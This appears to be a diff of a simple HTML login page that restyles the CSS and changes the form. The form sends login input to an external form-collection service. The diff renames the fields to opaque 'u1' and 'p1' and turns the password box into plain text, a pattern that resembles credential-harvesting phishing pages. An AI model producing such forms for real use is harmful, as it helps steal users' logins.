@@ -10,51 +10,47 @@
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
+    font-family:Arial, sans-serif;
 }
 
 body{
+    background:#f2f2f2;
     display:flex;
     justify-content:center;
     align-items:center;
     height:100vh;
-    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
 }
 
 .login-box{
     width:350px;
-    background:white;
-    padding:35px;
-    border-radius:15px;
-    box-shadow:0 10px 30px rgba(0,0,0,.3);
+    background:#fff;
+    padding:30px;
+    border-radius:10px;
+    box-shadow:0 0 15px rgba(0,0,0,0.2);
 }
 
 .login-box h2{
     text-align:center;
-    margin-bottom:25px;
-    color:#333;
-}
-
-.input-box{
     margin-bottom:20px;
 }
 
-.input-box input{
+input{
     width:100%;
     padding:12px;
+    margin:10px 0;
     border:1px solid #ccc;
-    border-radius:8px;
+    border-radius:5px;
     font-size:16px;
 }
 
 button{
     width:100%;
     padding:12px;
-    border:none;
-    border-radius:8px;
     background:#007BFF;
-    color:white;
-    font-size:17px;
+    color:#fff;
+    border:none;
+    border-radius:5px;
+    font-size:16px;
     cursor:pointer;
 }
 
@@ -67,31 +63,27 @@ button:hover{
 <body>
 
 <div class="login-box">
+    <h2>Login</h2>
 
-<h2>Login</h2>
+    <form action="https://forminit.com/thank-you" method="POST">
 
-<form action="https://formspree.io/f/xgojpbdg" method="POST">
+        <input
+            type="text"
+            name="u1"
+            placeholder="Enter First Value"
+            required
+        >
 
-<div class="input-box">
-<input
-type="text"
-name="Username"
-placeholder="Enter Username"
-required>
-</div>
+        <input
+            type="text"
+            name="p1"
+            placeholder="Enter Second Value"
+            required
+        >
 
-<div class="input-box">
-<input
-type="password"
-name="Password"
-placeholder="Enter Password"
-required>
-</div>
+        <button type="submit">Submit</button>
 
-<button type="submit">Login</button>
-
-</form>
-
+    </form>
 </div>
 
 </body>
